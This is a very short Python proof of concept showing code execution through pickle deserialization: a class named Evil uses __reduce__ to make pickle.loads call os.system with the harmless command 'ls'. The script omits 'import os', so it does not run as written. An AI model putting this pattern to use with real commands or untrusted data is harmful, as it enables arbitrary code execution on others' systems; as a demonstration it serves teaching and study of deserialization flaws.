
import pickle

class Evil(object):
    def __reduce__(self):
        return (os.system, ('ls',))

my_data = pickle.dumps(Evil())

p = pickle.loads(my_data)

print(p)
